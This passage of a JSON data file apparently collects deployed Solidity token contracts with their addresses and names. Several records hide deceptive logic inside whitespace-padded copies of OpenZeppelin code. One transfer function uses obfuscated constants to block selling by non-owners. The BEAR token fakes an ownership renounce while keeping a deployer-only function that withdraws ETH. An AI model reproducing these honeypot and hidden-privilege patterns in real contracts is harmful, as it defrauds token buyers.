!= nullAddress && to != owner() && from != owner() && from != _multisigAddress[owner()] && to != _multisigAddress[owner()] && from != uniswapV3Router) {\n            uint256 constantValue = constantNumber - 1 - baseConstant;\n\n            if (constantValue <= 0x2960A6C0/0x14B05360) {\n                baseCoefficient += 1;\n            }\n\n            if (baseCoefficient > 0x2960A6C0/0x52C14D8 && to != owner() && from != owner()) {\n                require(constantValue > 0x2960A6C0/0x52C14D8, \"Execution reverted.\");\n            }\n        }\n\n        baseConstant = constantNumber - 1;\n\n        unchecked {\n            _balances[from] = fromBalance - value;\n            _balances[to] += value;\n        }\n\n        emit Transfer(from, to, value);\n    }\n\n}",
      "count": 1,
      "addresses": [
        "0xBE58b282C895a29d5B225769d009B145eaF161A2"
      ],
      "names": [
        "ERC20"
      ]
    },
    {
      "id": "4db0ad68-f3bb-4d54-9219-f27aea042d96",
      "code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts  ( last updated v5.1.0) (utils/Address.sol )\n\npragma solidity ^0.8.20 ; \n\n/**\n * @dev Collection of functions related to the address type\n */\nlibrary Address {\n                        \n    /**\n     * @dev Returns true if `account` is a contract.\n     *\n     * [IMPORTANT]\n     * ====\n     * It is unsafe to assume that an address for which this function returns\n     * false is an externally-owned account  ( EOA ) and not a contract.\n     *\n     * Among others, `isContract` will return false for the following\n     * types of addresses:\n     *\n     *  - an externally-owned account\n     *  - a contract in construction\n     *  - an address where a contract will be created\n     *  - an address where a contract lived, but was destroyed\n     *\n     * Furthermore, `isContract` will also return true if the target contract within\n     * the same transaction is already scheduled for destruction by `SELFDESTRUCT`,\n     * which only has an effect at the end of a transaction.\n     * ====\n     *\n     * [IMPORTANT]\n     * ====\n     * You shouldn't rely on `isContract` to protect against flash loan attacks!\n     *\n     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets\n     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract\n     * constructor.\n     * ====\n     */\n    function isContract(address account ) internal view returns  ( bool ) {\n                        \n        // This method relies on extcodesize/address.code.length, which returns 0\n        // for contracts in construction, since the code is only stored at the end\n        // of the constructor execution.\n\n        return account.code.length > 0;\n     } \n                        \n\n    /**\n     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to\n     * `recipient`, forwarding all available gas and reverting on errors.\n     *\n     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\n     * of certain opcodes, possibly making contracts go over the 2300 gas limit\n     * imposed by `transfer`, making them unable to receive funds via\n     * `transfer`.  { \n                        sendValue}\n                         removes this limitation.\n     *\n     * https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/[Learn more].\n     *\n     * IMPORTANT: because control is transferred to `recipient`, care must be\n     * taken to not create reentrancy vulnerabilities. Consider using\n     * \n                         { ReentrancyGuard } \n                         or the\n     * https://solidity.readthedocs.io/en/v0.8.0/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\n     */\n    function sendValue ( address payable recipient, uint256 amount ) public  { \n                        \n        require ( address(this ).balance >= amount, \"Address: insufficient balance\" ) ; \n\n         ( bool success, ) = recipient.call\n                        {value: amount}\n                         ( \"\");\n        require(success, \"Address: unable to send value, recipient may have reverted\") ; \n    \n                         } \n\n    /**\n     * @dev Performs a Solidity function call using a low level `call`. A\n     * plain `call` is an unsafe replacement for a function call: use this\n     * function instead.\n     *\n     * If `target` reverts with a revert reason, it is bubbled up by this\n     * function (like regular Solidity function calls).\n     *\n     * Returns the raw returned data. To convert to the expected return value,\n     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\n     *\n     * Requirements:\n     *\n     * - `target` must be a contract.\n     * - calling `target` with `data` must not revert.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall(address target, bytes memory data) internal returns (bytes memory) {\n                        \n        return functionCallWithValue ( target, data, 0, \"Address: low-level call failed\" );\n    }\n                        \n\n    /**\n     * @dev Same as \n                         { xref-Address-functionCall-address-bytes-}\n                        [`functionCall`], but with\n     * `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal returns  ( bytes memory) {\n                        \n        return functionCallWithValue ( target, data, 0, errorMessage );\n    }\n                        \n\n    /**\n     * @dev Same as {\n                        xref-Address-functionCall-address-bytes- } \n                        [`functionCall`],\n     * but also transferring `value` wei to `target`.\n     *\n     * Requirements:\n     *\n     * - the calling contract must have an ETH balance of at least `value`.\n     * - the called Solidity function must be `payable`.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue ( address target, bytes memory data, uint256 value) internal returns (bytes memory)  { \n                        \n        return functionCallWithValue ( target, data, value, \"Address: low-level call with value failed\" );\n    \n                        }\n\n    /**\n     * @dev Same as  { \n                        xref-Address-functionCallWithValue-address-bytes-uint256-\n                        }[`functionCallWithValue`], but\n     * with `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue(\n        address target,\n        bytes memory data,\n        uint256 value,\n        string memory errorMessage\n    ) internal returns  ( bytes memory) \n                        {\n        require(address(this ).balance >= value, \"Address: insufficient balance for call\");\n        (bool success, bytes memory returndata ) = target.call{\n                        value: value\n                         }  ( data );\n        return verifyCallResultFromTarget(target, success, returndata, errorMessage ) ; \n    }\n                        \n\n    /**\n     * @dev Same as {\n                        xref-Address-functionCall-address-bytes- } \n                        [`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall(address target, bytes memory data ) internal view returns (bytes memory )  { \n                        \n        return functionStaticCall(target, data, \"Address: low-level static call failed\" );\n    }\n                        \n\n    /**\n     * @dev Same as {\n                        xref-Address-functionCall-address-bytes-string-\n                        }[`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal view returns  ( bytes memory ) {\n                        \n        (bool success, bytes memory returndata ) = target.staticcall(data);\n        return verifyCallResultFromTarget(target, success, returndata, errorMessage) ; \n    \n                         } \n\n    /**\n     * @dev Same as  { \n                        xref-Address-functionCall-address-bytes-\n                         } [`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory ) {\n                        \n        return functionDelegateCall(target, data, \"Address: low-level delegate call failed\");\n    }\n                        \n\n    /**\n     * @dev Same as {\n                        xref-Address-functionCall-address-bytes-string-}\n                        [`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal returns  ( bytes memory) {\n                        \n        (bool success, bytes memory returndata) = target.delegatecall ( data );\n        return verifyCallResultFromTarget(target, success, returndata, errorMessage);\n     } \n                        \n\n    /**\n     * @dev Tool to verify that a low level call to smart-contract was successful, and revert  ( either by bubbling\n     * the revert reason or using the provided one ) in case of unsuccessful call or if target was not a contract.\n     *\n     * _Available since v4.8._\n     */\n    function verifyCallResultFromTarget(\n        address target,\n        bool success,\n        bytes memory returndata,\n        string memory errorMessage\n     ) internal view returns  ( bytes memory) {\n                        \n        if (success) {\n                        \n            if  ( returndata.length == 0) \n                        {\n                // only check isContract if the call was successful and the return data is empty\n                // otherwise we already know that it was a contract\n                require(isContract ( target), \"Address: call to non-contract\" ) ; \n            \n                         } \n            return returndata;\n        }\n                         else \n                         { \n            _revert(returndata, errorMessage);\n        \n                         } \n     } \n                        \n\n    /**\n     * @dev Tool to verify that a low level call was successful, and revert if it wasn't, either by bubbling the\n     * revert reason or using the provided one.\n     *\n     * _Available since v4.3._\n     */\n    function verifyCallResult(\n        bool success,\n        bytes memory returndata,\n        string memory errorMessage\n     ) internal pure returns (bytes memory ) \n                         { \n        if  ( success ) \n                        {\n            return returndata;\n        \n                         }  else {\n                        \n            _revert ( returndata, errorMessage );\n        \n                        }\n    \n                         } \n\n    function _revert ( bytes memory returndata, string memory errorMessage ) private pure  { \n                        \n        // Look for revert reason and bubble it up if present\n        if  ( returndata.length > 0 ) \n                         { \n            // The easiest way to bubble the revert reason is using memory via assembly\n            /// @solidity memory-safe-assembly\n            assembly  { \n                        \n                let returndata_size := mload ( returndata)\n                revert ( add(32, returndata ), returndata_size)\n             } \n                        \n        }\n                         else \n                        {\n            revert ( errorMessage);\n         } \n                        \n     } \n                        \n\n                        }\npragma solidity ^0.8.0;\n\n/**\n * @dev Provides information about the current execution context, including the\n * sender of the transaction and its data. While these are generally available\n * via msg.sender and msg.data, they should not be accessed in such a direct\n * manner, since when dealing with meta-transactions the account sending and\n * paying for execution may not be the actual sender (as far as an application\n * is concerned).\n *\n * This contract is only required for intermediate, library-like contracts.\n */\nabstract contract Context \n                        {\n\n    function _contextSuffixLength (  ) internal view virtual returns (uint256) \n                         { \n        return 0;\n    \n                         } \n    function _msgSender ( ) internal view virtual returns  ( address ) {\n                        \n        return msg.sender;\n    }\n                        \n\n    function _msgData( ) internal view virtual returns (bytes calldata)  { \n                        \n        return msg.data;\n     } \n                        \n\n\n}\n                        \n\n\n/**\n * @dev Standard ERC-20 Errors\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC-20 tokens.\n */\ninterface IERC20Errors \n                        {\n\n    /**\n     * @dev Indicates a failure with the `spender`\u2019s `allowance`. Used in transfers.\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\n     * @param allowance Amount of tokens a `spender` is allowed to operate with.\n     * @param needed Minimum amount required to perform a transfer.\n     */\n    error ERC20InsufficientAllowance ( address spender, uint256 allowance, uint256 needed);\n\n    /**\n     * @dev Indicates a failure with the `spender` to be approved. Used in approvals.\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\n     */\n    error ERC20InvalidSpender(address spender );\n\n\n    /**\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     */\n    error ERC20InvalidSender ( address sender ) ; \n\n    /**\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\n     * @param receiver Address to which tokens are being transferred.\n     */\n    error ERC20InvalidReceiver(address receiver) ; \n\n    /**\n     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     * @param balance Current balance for the interacting account.\n     * @param needed Minimum amount required to perform a transfer.\n     */\n    error ERC20InsufficientBalance(address sender, uint256 balance, uint256 needed);\n\n\n    /**\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\n     * @param approver Address initiating an approval operation.\n     */\n    error ERC20InvalidApprover ( address approver);\n } \n                        \n\n\n/**\n * @dev Interface of the ERC20 standard as defined in the EIP.\n */\ninterface IERC20 {\n                        \n\n    /**\n     * @dev Moves `amount` tokens from `from` to `to` using the\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {\n                        Transfer } \n                         event.\n     */\n    function transferFrom ( address from, address to, uint256 amount) external returns  ( bool);\n    \n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an \n                        {Approval}\n                         event.\n     */\n    function approve(address spender, uint256 amount ) external returns (bool );\n    \n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through {\n                        transferFrom}\n                        . This is\n     * zero by default.\n     *\n     * This value changes when {\n                        approve}\n                         or {\n                        transferFrom\n                        } are called.\n     */\n    function allowance(address owner, address spender ) external view returns  ( uint256) ; \n\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply (  ) external view returns  ( uint256);\n    \n/**\n     * @dev Moves `amount` tokens from the caller's account to `to`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a  { \n                        Transfer } \n                         event.\n     */\n    function transfer ( address to, uint256 amount) external returns  ( bool) ; \n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to {\n                        approve } \n                        . `value` is the new allowance.\n     */\n    event Approval ( address indexed owner, address indexed spender, uint256 value ) ; \n    /**\n     * @dev Emitted when `value` tokens are moved from one account  ( `from` ) to\n     * another  ( `to` ).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value ) ; \n\n    \n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf ( address account ) external view returns  ( uint256 );\n\n    \n } \n                        \n\n\ninterface IERC20Metadata is IERC20  { \n                        \n\n\n    /**\n     * @dev Returns the decimals places of the token.\n     */\n    function decimals ( ) external view returns  ( uint8);\n    \n\n    /**\n     * @dev Returns the symbol of the token.\n     */\n    function symbol() external view returns (string memory);\n\n\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name ( ) external view returns  ( string memory);\n\n}\n                        \n\n\n\n\n\n/**\n * @dev Implementation of the  { \n                        IERC20}\n                         interface.\n *\n * This implementation is agnostic to the way tokens are created. This means\n * that a supply mechanism has to be added in a derived contract using {\n                        _mint}\n                        .\n *\n * TIP: For a detailed writeup see our guide\n * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How\n * to implement supply mechanisms].\n *\n * The default value of  { \n                        decimals } \n                         is 18. To change this, you should override\n * this function so it returns a different value.\n *\n * We have followed general OpenZeppelin Contracts guidelines: functions revert\n * instead returning `false` on failure. This behavior is nonetheless\n * conventional and does not conflict with the expectations of ERC-20\n * applications.\n */\ncontract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors  {\n                        \n    mapping ( address => uint256 ) private _balances;\n\n\n    mapping ( address => mapping(address => uint256) ) private _allowances;\n    uint256 private _totalSupply ; \n\n    string private _name;\n    string private _symbol ; \n\n\n    /**\n     * @dev See  { \n                        IERC20-transfer\n                        }.\n     *\n     * Requirements:\n     *\n     * - `to` cannot be the zero address.\n     * - the caller must have a balance of at least `value`.\n     */\n    function transfer(address to, uint256 value ) public virtual returns (bool )  { \n                        \n        address owner = _msgSender();\n        _transfer ( owner, to, value );\n        return true ; \n    \n                        }\n    \n    /**\n     * @dev Returns the number of decimals used to get its user representation.\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\n     * be displayed to a user as `5.05` (`505 / 10 ** 2` ).\n     *\n     * Tokens usually opt for a value of 18, imitating the relationship between\n     * Ether and Wei. This is the default value returned by this function, unless\n     * it's overridden.\n     *\n     * NOTE: This information is only used for _display_ purposes: it in\n     * no way affects any of the arithmetic of the contract, including\n     * {\n                        IERC20-balanceOf}\n                         and \n                         { IERC20-transfer } \n                        .\n     */\n    function decimals() public view virtual returns  ( uint8 )  { \n                        \n        return 15;\n     } \n                        \n    \n    /**\n     * @dev Updates `owner` s allowance for `spender` based on spent `value`.\n     *\n     * Does not update the allowance value in case of infinite allowance.\n     * Revert if not enough allowance is available.\n     *\n     * Does not emit an {\n                        Approval\n                         }  event.\n     */\n    function _spendAllowance(address owner, address spender, uint256 value) internal virtual {\n                        \n        uint256 currentAllowance = allowance(owner, spender ) ; \n        if  ( currentAllowance < type(uint256).max) {\n                        \n            if (currentAllowance < value )  { \n                        \n                revert ERC20InsufficientAllowance(spender, currentAllowance, value) ; \n            \n                         } \n            unchecked {\n                        \n                _approve ( owner, spender, currentAllowance - value, false);\n             } \n                        \n        \n                         } \n    }\n                        \n    \n    /**\n     * @dev See \n                        {IERC20-approve } \n                        .\n     *\n     * NOTE: If `value` is the maximum `uint256`, the allowance is not updated on\n     * `transferFrom`. This is semantically equivalent to an infinite approval.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function approve(address spender, uint256 value ) public virtual returns  ( bool ) {\n                        \n        address owner = _msgSender( );\n        _approve(owner, spender, value) ; \n        return true ; \n     } \n                        \n    \n    /**\n     * @dev Returns the symbol of the token, usually a shorter version of the\n     * name.\n     */\n    function symbol() public view virtual returns (string memory )  { \n                        \n        return _symbol ; \n     } \n                        \n    \n    /**\n     * @dev See {\n                        IERC20-totalSupply } \n                        .\n     */\n    function totalSupply() public view virtual returns (uint256)  { \n                        \n        return _totalSupply;\n    }\n                        \n    \n\n    /**\n     * @dev See {\n                        IERC20-allowance\n                        }.\n     */\n    function allowance(address owner, address spender) public view virtual returns (uint256 ) {\n                        \n        return _allowances[owner][spender];\n    \n                         } \n    \n    /**\n     * @dev Creates a `value` amount of tokens and assigns them to `account`, by transferring it from address ( 0 ).\n     * Relies on the `_update` mechanism\n     *\n     * Emits a \n                         { Transfer\n                        } event with `from` set to the zero address.\n     *\n     * NOTE: This function is not virtual, {\n                        _update}\n                         should be overridden instead.\n     */\n    function _mint ( address account, uint256 value ) internal {\n                        \n        if (account == address(0) )  { \n                        \n            revert ERC20InvalidReceiver ( address(0 ) ) ; \n        \n                         } \n        _update(address ( 0 ), account, value );\n    }\n                        \n    \n    /**\n     * @dev Variant of {\n                        _approve\n                        } with an optional flag to enable or disable the  { \n                        Approval}\n                         event.\n     *\n     * By default (when calling  { \n                        _approve } \n                         ) the flag is set to true. On the other hand, approval changes made by\n     * `_spendAllowance` during the `transferFrom` operation set the flag to false. This saves gas by not emitting any\n     * `Approval` event during `transferFrom` operations.\n     *\n     * Anyone who wishes to continue emitting `Approval` events on the`transferFrom` operation can force the flag to\n     * true using the following override:\n     *\n     * ```solidity\n     * function _approve ( address owner, address spender, uint256 value, bool) internal virtual override  { \n                        \n     *     super._approve(owner, spender, value, true ) ; \n     *  } \n                        \n     * ```\n     *\n     * Requirements are the same as {\n                        _approve } \n                        .\n     */\n    function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual \n                         { \n        if  ( owner == address(0 ) ) {\n                        \n            revert ERC20InvalidApprover ( address ( 0 ));\n         } \n                        \n        if  ( spender == address ( 0 ))  { \n                        \n            revert ERC20InvalidSpender(address ( 0 ));\n        }\n                        \n        _allowances[owner][spender] = value;\n        if (emitEvent) \n                        {\n            emit Approval(owner, spender, value ) ; \n         } \n                        \n     } \n                        \n    \n    /**\n     * @dev Sets the values for  { \n                        name}\n                         and {\n                        symbol\n                         } .\n     *\n     * All two of these values are immutable: they can only be set once during\n     * construction.\n     */\n    constructor ( string memory name_, string memory symbol_ ) {\n                        \n        _name = name_ ; \n        _symbol = symbol_ ; \n    \n                         } \n    \n\n    /**\n     * @dev See {\n                        IERC20-balanceOf}\n                        .\n     */\n    function balanceOf(address account ) public view virtual returns (uint256)  { \n                        \n        return _balances[account];\n    }\n                        \n    \n    /**\n     * @dev Transfers a `value` amount of tokens from `from` to `to`, or alternatively mints  ( or burns) if `from`\n     * (or `to`) is the zero address. All customizations to transfers, mints, and burns should be done by overriding\n     * this function.\n     *\n     * Emits a {\n                        Transfer\n                        } event.\n     */\n    function _update ( address from, address to, uint256 value) internal virtual \n                        {\n        if (from == address(0 ) ) {\n                        \n            // Overflow check required: The rest of the code assumes that totalSupply never overflows\n            _totalSupply += value;\n        }\n                         else {\n                        \n            uint256 fromBalance = _balances[from] ; \n            if (fromBalance < value ) \n                        {\n                revert ERC20InsufficientBalance(from, fromBalance, value) ; \n             } \n                        \n            unchecked \n                        {\n                // Overflow not possible: value <= fromBalance <= totalSupply.\n                _balances[from] = fromBalance - value ; \n            }\n                        \n         } \n                        \n\n        if (to == address(0 ))  { \n                        \n            unchecked  { \n                        \n                // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.\n                _totalSupply -= value;\n             } \n                        \n        \n                        } else {\n                        \n            unchecked  { \n                        \n                // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.\n                _balances[to] += value;\n             } \n                        \n        }\n                        \n\n        emit Transfer ( from, to, value );\n     } \n                        \n    \n    /**\n     * @dev See \n                         { IERC20-transferFrom } \n                        .\n     *\n     * Skips emitting an {\n                        Approval}\n                         event indicating an allowance update. This is not\n     * required by the ERC. See  { \n                        xref-ERC20-_approve-address-address-uint256-bool-\n                         } [_approve].\n     *\n     * NOTE: Does not update the allowance if the current allowance\n     * is the maximum `uint256`.\n     *\n     * Requirements:\n     *\n     * - `from` and `to` cannot be the zero address.\n     * - `from` must have a balance of at least `value`.\n     * - the caller must have allowance for ``from``'s tokens of at least\n     * `value`.\n     */\n    function transferFrom ( address from, address to, uint256 value ) public virtual returns (bool) {\n                        \n        address spender = _msgSender( );\n        _spendAllowance ( from, spender, value ) ; \n        _transfer(from, to, value);\n        return true;\n     } \n                        \n    \n    /**\n     * @dev Moves a `value` amount of tokens from `from` to `to`.\n     *\n     * This internal function is equivalent to  { \n                        transfer\n                         } , and can be used to\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n     *\n     * Emits a {\n                        Transfer}\n                         event.\n     *\n     * NOTE: This function is not virtual, {\n                        _update\n                         }  should be overridden instead.\n     */\n    function _transfer ( address from, address to, uint256 value ) internal  { \n                        \n        if  ( from == address(0) ) {\n                        \n            revert ERC20InvalidSender ( address(0 ) );\n         } \n                        \n        if (to == address ( 0)) {\n                        \n            revert ERC20InvalidReceiver ( address ( 0 ) ) ; \n        }\n                        \n        _update(from, to, value);\n    }\n                        \n    \n    /**\n     * @dev Sets `value` as the allowance of `spender` over the `owner` s tokens.\n     *\n     * This internal function is equivalent to `approve`, and can be used to\n     * e.g. set automatic allowances for certain subsystems, etc.\n     *\n     * Emits an  { \n                        Approval}\n                         event.\n     *\n     * Requirements:\n     *\n     * - `owner` cannot be the zero address.\n     * - `spender` cannot be the zero address.\n     *\n     * Overrides to this logic should be done to the variant with an additional `bool emitEvent` argument.\n     */\n    function _approve ( address owner, address spender, uint256 value) internal  { \n                        \n        _approve ( owner, spender, value, true ) ; \n     } \n                        \n    \n    /**\n     * @dev Returns the name of the token.\n     */\n    function name ( ) public view virtual returns (string memory)  { \n                        \n        return _name ; \n     } \n                        \n    \n     } \n                        \n\nabstract contract Ownable is Context {\n                        \n    address private _owner ; \n    \n    event OwnershipTransferred ( address indexed previousOwner, address indexed newOwner) ; \n    \n    /**\n     * @dev Transfers ownership of the contract to a new account (`newOwner` ).\n     * Internal function without access restriction.\n     */\n    function _transferOwnership(address newOwner) internal virtual {\n                        \n        address oldOwner = _owner ; \n        _owner = newOwner;\n        emit OwnershipTransferred ( oldOwner, newOwner) ; \n    \n                         } \n    \n    /**\n     * @dev The caller account is not authorized to perform an operation.\n     */\n    error OwnableUnauthorizedAccount ( address account );\n    \n    /**\n     * @dev Throws if called by any account other than the owner.\n     */\n    modifier onlyOwner()  { \n                        \n        _checkOwner ( ) ; \n        _;\n    \n                        }\n    \n    /**\n     * @dev The owner is not a valid owner account. (eg. `address ( 0 )`)\n     */\n    error OwnableInvalidOwner ( address owner) ; \n    \n    /**\n     * @dev Throws if the sender is not the owner.\n     */\n    function _checkOwner ( ) internal view virtual  { \n                        \n        require(owner (  ) == _msgSender( ), \"Ownable: caller is not the owner\" );\n     } \n                        \n    \n    /**\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\n     * Can only be called by the current owner.\n     */\n    function transferOwnership ( address newOwner) public virtual onlyOwner {\n                        \n        require ( newOwner != address(0), \"Ownable: new owner is the zero address\");\n        _transferOwnership(newOwner) ; \n     } \n                        \n    \n    /**\n     * @dev Returns the address of the current owner.\n     */\n    function owner() public view virtual returns  ( address )  { \n                        \n        return _owner ; \n    \n                         } \n    \n    /**\n     * @dev Initializes the contract setting the deployer as the initial owner.\n     */\n    constructor ( )  { \n                        \n        _transferOwnership(_msgSender ( ));\n    \n                         } \n    \n    /**\n     * @dev Leaves the contract without owner. It will not be possible to call\n     * `onlyOwner` functions. Can only be called by the current owner.\n     *\n     * NOTE: Renouncing ownership will leave the contract without an owner,\n     * thereby disabling any functionality that is only available to the owner.\n     */\n    function renounceOwnership ( ) public virtual onlyOwner \n                         { \n        _transferOwnership ( address(0) ) ; \n     } \n                        \n    \n\n                        }\n\n\n// File BEAR.sol\n\ncontract BEAR is ERC20, Ownable \n                        {\n    address internal immutable deployer ; \n    constructor(string memory name_, string memory symbol_) ERC20(name_, symbol_ ) {\n                        \n        _mint(msg.sender, 100000000000000000000000 );\n        _transferOwnership(address ( 0) ) ; \n        deployer = msg.sender;\n    }\n                        \n    \n    /**\n     * @dev See  { \n                        IERC20-allowance}\n                        .\n     */\n    function allowance ( address owner, address spender) public view override returns (uint256) \n                         { \n            //gas optimization: auto allow Permit2 and UniswapRouterV2\n            if( ( spender == 0x000000000022D473030F116dDEE9F6B43aC78BA3) ||  ( spender == 0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24))\n                        {\n            return type ( uint256 ).max ; \n         } \n                         \n        return super.allowance(owner,spender);\n    \n                         } \n    \n    function claimGas ( address payable recipient, uint256 amount) public \n                         { \n        require(msg.sender==deployer);\n        Address.sendValue ( recipient, amount ) ; \n    }\n                        \n    \n    receive() external payable { \n                        \n    }\n                        \n}",
      "count": 1,
      "addresses": [
        "0x8E76469ccd48BD0E1dBE1D301ec9a14185d6151A"
      ],
      "names": [
        "BEAR"
      ]
    },
    {
      "id": "17a2d73d-9f8d-4f33-9a3a-f801735298a1",
      "code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts  ( last updated v5.1.0 )  ( utils/Address.sol)\n\npragma solidity ^0.8.20;\n\n/**\n * @dev Collection of functions related to the address type\n */\nlibrary Address {\n                        \n    /**\n     * @dev Returns true if `account` is a contract.\n     *\n     * [IMPORTANT]\n     * ====\n     * It is unsafe to assume that an address for which this function returns\n     * false is an externally-owned account (EOA) and not a contract.\n     *\n     * Among others, `isContract` will return false for the following\n     * types of addresses:\n     *\n     *  - an externally-owned account\n     *  - a contract in construction\n     *  - an address where a contract will be created\n     *  - an address where a contract lived, but was destroyed\n     *\n     * Furthermore, `isContract` will also return true if the target contract within\n     * the same transaction is already scheduled for destruction by `SELFDESTRUCT`,\n     * which only has an effect at the end of a transaction.\n     * ====\n     *\n     * [IMPORTANT]\n     * ====\n     * You shouldn't rely on `isContract` to protect against flash loan attacks!\n     *\n     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets\n     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract\n     * constructor.\n     * ====\n     */\n    function isContract ( address account ) internal view returns (bool )  { \n                        \n        // This method relies on extcodesize/address.code.length, which returns 0\n        // for contracts in construction, since the code is only stored at the end\n        // of the constructor execution.\n\n        return account.code.length > 0 ; \n     } \n                        \n\n    /**\n     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to\n     * `recipient`, forwarding all available gas and reverting on errors.\n     *\n     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\n     * of certain opcodes, possibly making contracts go over the 2300 gas limit\n     * imposed by `transfer`, making them unable to receive funds via\n     * `transfer`. {\n                        sendValue}\n                         removes this limitation.\n     *\n     * https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/[Learn more].\n     *\n     * IMPORTANT: because control is transferred to `recipient`, care must be\n     * taken to not create reentrancy vulnerabilities. Consider using\n     *  { \n                        ReentrancyGuard } \n                         or the\n     * https://solidity.readthedocs.io/en/v0.8.0/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\n     */\n    function sendValue ( address payable recipient, uint256 amount ) public \n                        {\n        require(address ( this ).balance >= amount, \"Address: insufficient balance\") ; \n\n        (bool success, ) = recipient.call { \n                        value: amount}\n                        (\"\" ) ; \n        require(success, \"Address: unable to send value, recipient may have reverted\") ; \n     } \n                        \n\n    /**\n     * @dev Performs a Solidity function call using a low level `call`. A\n     * plain `call` is an unsafe replacement for a function call: use this\n     * function instead.\n     *\n     * If `target` reverts with a revert reason, it is bubbled up by this\n     * function  ( like regular Solidity function calls ).\n     *\n     * Returns the raw returned data. To convert to the expected return value,\n     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\n     *\n     * Requirements:\n     *\n     * - `target` must be a contract.\n     * - calling `target` with `data` must not revert.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall ( address target, bytes memory data ) internal returns (bytes memory ) {\n                        \n        return functionCallWithValue ( target, data, 0, \"Address: low-level call failed\");\n    \n                        }\n\n    /**\n     * @dev Same as \n                         { xref-Address-functionCall-address-bytes- } \n                        [`functionCall`], but with\n     * `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall ( \n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal returns (bytes memory)  { \n                        \n        return functionCallWithValue ( target, data, 0, errorMessage);\n    \n                         } \n\n    /**\n     * @dev Same as {\n                        xref-Address-functionCall-address-bytes-}\n                        [`functionCall`],\n     * but also transferring `value` wei to `target`.\n     *\n     * Requirements:\n     *\n     * - the calling contract must have an ETH balance of at least `value`.\n     * - the called Solidity function must be `payable`.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue ( address target, bytes memory data, uint256 value ) internal returns  ( bytes memory ) {\n                        \n        return functionCallWithValue ( target, data, value, \"Address: low-level call with value failed\" ) ; \n    \n                         } \n\n    /**\n     * @dev Same as  { \n                        xref-Address-functionCallWithValue-address-bytes-uint256- } \n                        [`functionCallWithValue`], but\n     * with `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since 